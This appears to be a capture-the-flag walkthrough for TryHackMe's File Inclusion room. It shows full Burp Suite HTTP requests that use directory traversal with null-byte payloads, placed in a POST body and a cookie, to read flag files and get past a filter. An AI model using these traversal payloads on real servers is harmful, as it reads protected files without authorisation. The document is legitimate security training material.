# My goal is to provide methods to complete the File Inclusion room on TryHackMe using only Burpsuite and not curL as other walkthroughs do. This does assume a basic understanding of Burpsutie
# Challenge 1
For challenge one we can test out entering /etc/flag1 into the form and then view the web request in burp suite after intercepting it, the web request looks like
```
GET /challenges/chall1.php?file=%2Fetc%2Fflag HTTP/1.1
Host: [IP]
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.152.198/challenges/chall1.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
So the thign we need to do is change the http method being used to post as the challenge tells us such that <br>
```POST /challenges/chall1.php HTTP/1.1```
Curl would use the -d to add information to the request body and to do this in burpsuite we need to add headers to the original request. Specifically the Content Type and when the data is addedd the  Content-Length field should be automatically filled by Burpsuite
<br> 
<br>
Lastly we must add the null byte in order to get to the php file on the server
```
POST /challenges/chall1.php HTTP/1.1
Host: [IP]
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

file=../../../../../../etc/flag1%00
```
# Challenge 2
This challenge is about dealing with the cookie the page has. If we refresh the page as it prompts us to do we see in the web request
```
GET /challenges/chall2.php HTTP/1.1
Host: [IP]
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: THM=Guest
Connection: close
```
All we need to do for this challenge is edit the THM cookie to
```
Cookie: THM=../../../../../etc/flag2%00
Connection: close
```
and we are given the flag
# Challenge 3
To start this challenge we will submit /etc/flag3 and see what happens and check the response, in there things to note
```
File Content Preview of <b>
    etcflag
```
So the data being entered through the bar is being filtered, the slashes and the number to read the flag so even if we tried a dot-dot-slash attack it will still not be able to work.
<br>
<br>
Similarly to challenge one we will change the http method to POST add Content-Type header and submit the request body as before along with the null byte
```
POST /challenges////chall3.php HTTP/1.1
Host: [IP]
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 54
Content-Type: application/x-www-form-urlencoded

file=../../../../etc/flag3%00
```
Sending this request we can view the final challenge flag
